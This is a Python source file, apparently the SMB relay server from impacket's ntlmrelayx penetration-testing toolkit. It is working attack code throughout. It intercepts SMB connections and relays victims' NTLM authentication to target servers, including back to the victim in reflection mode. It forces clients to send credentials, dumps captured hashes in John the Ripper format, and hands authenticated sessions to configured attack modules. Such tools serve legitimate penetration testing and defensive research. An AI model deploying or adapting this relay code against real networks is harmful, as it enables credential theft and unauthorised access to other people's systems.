# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Server
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This is the SMB server which relays the connections
#   to other protocols

from threading import Thread
import ConfigParser
import struct
import logging
import time
import calendar
import random
import string
import socket

from binascii import hexlify
from impacket import smb, ntlm, LOG, smb3
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbserver import getFileTime

class SMBRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        if self.config.smb2support is True:
            smbConfig.set("global", "SMB2Support", "True")
        else:
            smbConfig.set("global", "SMB2Support", "False")

        if self.config.outputFile is not None:
            smbConfig.set('global','jtr_dump_path',self.config.outputFile)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        # Change address_family to IPv6 if this is configured
        if self.config.ipv6:
            SMBSERVER.address_family = socket.AF_INET6

        # changed to dereference configuration interfaceIp
        self.server = SMBSERVER((config.interfaceIp,445), config_parser = smbConfig)
        logging.getLogger('impacket.smbserver').setLevel(logging.CRITICAL)

        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)

        self.origSmbNegotiate = self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self.SmbNegotiate)
        self.origSmbSessionSetup = self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self.SmbSessionSetup)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        #TODO: See if this is the best way to accomplish this

        # changed to dereference configuration interfaceIp
        self.server.addConnection('SMBRelay', config.interfaceIp, 445)

    ### SMBv2 Part #################################################################
    def SmbNegotiate(self, connId, smbServer, recvPacket, isSMB1=False):
        connData = smbServer.getConnectionData(connId, checkStatus=False)

        if self.config.mode.upper() == 'REFLECTION':
            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

        self.target = self.targetprocessor.getTarget()

        #############################################################
        # SMBRelay
        # Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        LOG.info("SMBD: Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))

        try:
            if self.config.mode.upper() == 'REFLECTION':
                # Force standard security when doing reflection
                LOG.debug("Downgrading to standard security")
                extSec = False
                #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            else:
                extSec = True
            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception, e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)

        respPacket = smb3.SMB2Packet()
        respPacket['Flags'] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status'] = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command'] = smb3.SMB2_NEGOTIATE
        respPacket['SessionID'] = 0

        if isSMB1 is False:
            respPacket['MessageID'] = recvPacket['MessageID']
        else:
            respPacket['MessageID'] = 0

        respPacket['TreeID'] = 0

        respSMBCommand = smb3.SMB2Negotiate_Response()

        # Just for the Nego Packet, then disable it
        respSMBCommand['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED

        if isSMB1 is True:
            # Let's first parse the packet to see if the client supports SMB2
            SMBCommand = smb.SMBCommand(recvPacket['Data'][0])

            dialects = SMBCommand['Data'].split('\x02')
            if 'SMB 2.002\x00' in dialects or 'SMB 2.???\x00' in dialects:
                respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
                #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21
            else:
                # Client does not support SMB2 fallbacking
                raise Exception('SMB2 not supported, fallbacking')
        else:
            respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
            #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21

        respSMBCommand['ServerGuid'] = ''.join([random.choice(string.letters) for _ in range(16)])
        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaxTransactSize'] = 65536
        respSMBCommand['MaxReadSize'] = 65536
        respSMBCommand['MaxWriteSize'] = 65536
        respSMBCommand['SystemTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['ServerStartTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['SecurityBufferOffset'] = 0x80

        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'],
                             TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]


        respSMBCommand['Buffer'] = blob.getData()
        respSMBCommand['SecurityBufferLength'] = len(respSMBCommand['Buffer'])

        respPacket['Data'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], STATUS_SUCCESS


    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb3.SMB2SessionSetup_Response()
        sessionSetupData = smb3.SMB2SessionSetup(recvPacket['Data'])

        connData['Capabilities'] = sessionSetupData['Capabilities']

        securityBlob = sessionSetupData['Buffer']

        rawNTLM = False
        if struct.unpack('B',securityBlob[0])[0] == ASN1_AID:
           # NEGOTIATE packet
           blob =  SPNEGO_NegTokenInit(securityBlob)
           token = blob['MechToken']
           if len(blob['MechTypes'][0]) > 0:
               # Is this GSSAPI NTLM or something else we don't support?
               mechType = blob['MechTypes'][0]
               if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                               mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
                   # Nope, do we know it?
                   if MechTypes.has_key(mechType):
                       mechStr = MechTypes[mechType]
                   else:
                       mechStr = hexlify(mechType)
                   smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL)
                   # We don't know the token, we answer back again saying
                   # we just support NTLM.
                   # ToDo: Build this into a SPNEGO_NegTokenResp()
                   respToken = '\xa1\x15\x30\x13\xa0\x03\x0a\x01\x03\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'
                   respSMBCommand['SecurityBufferOffset'] = 0x48
                   respSMBCommand['SecurityBufferLength'] = len(respToken)
                   respSMBCommand['Buffer'] = respToken

                   return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
        elif struct.unpack('B',securityBlob[0])[0] == ASN1_SUPPORTED_MECH:
           # AUTH packet
           blob = SPNEGO_NegTokenResp(securityBlob)
           token = blob['ResponseToken']
        else:
           # No GSSAPI stuff, raw NTLMSSP
           rawNTLM = True
           token = securityBlob

        # Here we only handle NTLMSSP, depending on what stage of the
        # authentication we are, we act on it
        messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

        if messageType == 0x01:
            # NEGOTIATE_MESSAGE
            negotiateMessage = ntlm.NTLMAuthNegotiate()
            negotiateMessage.fromString(token)
            # Let's store it in the connection data
            connData['NEGOTIATE_MESSAGE'] = negotiateMessage

            #############################################################
            # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
            # Let's send it to the target server and send the answer back to the client.
            client = smbData[self.target]['SMBClient']
            try:
                challengeMessage = self.do_ntlm_negotiate(client, token)
            except Exception, e:
                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)
                # Raise exception again to pass it on to the SMB server
                raise

             #############################################################

            if rawNTLM is False:
                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = challengeMessage.getData()
            else:
                respToken = challengeMessage

            # Setting the packet to STATUS_MORE_PROCESSING
            errorCode = STATUS_MORE_PROCESSING_REQUIRED
            # Let's set up an UID for this connection and store it
            # in the connection's data
            connData['Uid'] = random.randint(1,0xffffffff)

            connData['CHALLENGE_MESSAGE'] = challengeMessage

        elif messageType == 0x02:
            # CHALLENGE_MESSAGE
            raise Exception('Challenge Message raise, not implemented!')

        elif messageType == 0x03:
            # AUTHENTICATE_MESSAGE, here we deal with authentication
            #############################################################
            # SMBRelay: Ok, so now the have the Auth token, let's send it
            # back to the target system and hope for the best.
            client = smbData[self.target]['SMBClient']
            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)
            if authenticateMessage['user_name'] != '':
                # For some attacks it is important to know the authenticated username, so we store it

                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()
                if rawNTLM is True:
                    respToken2 = SPNEGO_NegTokenResp()
                    respToken2['ResponseToken'] = str(securityBlob)
                    securityBlob = respToken2.getData()

                clientResponse, errorCode = self.do_ntlm_auth(client, securityBlob,
                                                              connData['CHALLENGE_MESSAGE']['challenge'])
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                errorCode = STATUS_ACCESS_DENIED

            if errorCode != STATUS_SUCCESS:
                #Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)
                LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                authenticateMessage['user_name']))
                client.killConnection()
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target, True)

                ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                    authenticateMessage['user_name'],
                                                    authenticateMessage['domain_name'], authenticateMessage['lanman'],
                                                    authenticateMessage['ntlm'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                del (smbData[self.target])

                connData['Authenticated'] = True

                self.do_attack(client)
                # Now continue with the server
            #############################################################

            respToken = SPNEGO_NegTokenResp()
            # accept-completed
            respToken['NegResult'] = '\x00'
            # Let's store it in the connection data
            connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
        else:
            raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

        respSMBCommand['SecurityBufferOffset'] = 0x48
        respSMBCommand['SecurityBufferLength'] = len(respToken)
        respSMBCommand['Buffer'] = respToken.getData()

        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode
    ################################################################################

    ### SMBv1 Part #################################################################
    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.config.mode.upper() == 'REFLECTION':
            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

        #TODO: Check if a cache is better because there is no way to know which target was selected for this victim
        # except for relying on the targetprocessor selecting the same target unless a relay was already done
        self.target = self.targetprocessor.getTarget()

        #############################################################
        # SMBRelay
        # Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)

        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        LOG.info("SMBD: Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))

        try:
            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                if self.config.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    LOG.debug("Downgrading to standard security")
                    extSec = False
                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True

            #Init the correct client for our target
            client = self.init_client(extSec)
        except Exception, e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)

        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                # Let's send it to the target server and send the answer back to the client.
                client = smbData[self.target]['SMBClient']
                try:
                    challengeMessage = self.do_ntlm_negotiate(client,token)
                except Exception, e:
                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)
                    # Raise exception again to pass it on to the SMB server
                    raise

                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED

                # Let's set up an UID for this connection and store it
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10

                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                client = smbData[self.target]['SMBClient']
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if authenticateMessage['user_name'] != '':
                    #For some attacks it is important to know the authenticated username, so we store it
                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                authenticateMessage['user_name'].decode('utf-16le'))).upper()

                    clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],
                                                                  connData['CHALLENGE_MESSAGE']['challenge'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = '\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff

                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                    authenticateMessage['user_name']))

                    #Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)

                    client.killConnection()

                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'], authenticateMessage['user_name']))

                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target, True)

                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())

                    del (smbData[self.target])

                    self.do_attack(client)
                    # Now continue with the server
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            #TODO: Fix this for other protocols than SMB [!]
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData       = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])

            client = smbData[self.target]['SMBClient']
            _, errorCode = client.sendStandardSecurityAuth(sessionSetupData)

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff

                #Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)

                # Finish client's connection
                #client.killConnection()

                return None, [packet], errorCode
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, sessionSetupData['PrimaryDomain'],
                    sessionSetupData['Account']))

                self.authUser = ('%s/%s' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account'])).upper()

                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target, True)

                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                del (smbData[self.target])

                self.do_attack(client)
                # Now continue with the server
            #############################################################

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True

        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode
    ################################################################################

    #Initialize the correct client for the relay target
    def init_client(self,extSec):
        if self.config.protocolClients.has_key(self.target.scheme.upper()):
            client = self.config.protocolClients[self.target.scheme.upper()](self.config, self.target, extendedSecurity = extSec)
            client.initConnection()
        else:
            raise Exception('Protocol Client for %s not found!' % self.target.scheme)


        return client

    def do_ntlm_negotiate(self,client,token):
        #Since the clients all support the same operations there is no target protocol specific code needed for now
        return client.sendNegotiate(token)

    def do_ntlm_auth(self,client,SPNEGO_token,challenge):
        #The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        clientResponse, errorCode = client.sendAuth(str(SPNEGO_token), challenge)

        return clientResponse, errorCode

    def do_attack(self,client):
        #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
        # Check if SOCKS is enabled and if we support the target scheme
        if self.config.runSocks and self.target.scheme.upper() in self.config.socksServer.supportedSchemes:
            if self.config.runSocks is True:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, client.targetPort, self.target.scheme.upper(),
                                       self.authUser, client, client.sessionData))
                return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.config.attacks:
            # We have an attack.. go for it
            clientThread = self.config.attacks[self.target.scheme.upper()](self.config, client.session, self.authUser)
            clientThread.start()
        else:
            LOG.error('No attack configured for %s' % self.target.scheme.upper())

    def _start(self):
        self.server.daemon_threads=True
        self.server.serve_forever()
        LOG.info('Shutting down SMB Server')
        self.server.server_close()

    def run(self):
        LOG.info("Setting up SMB Server")
        self._start()
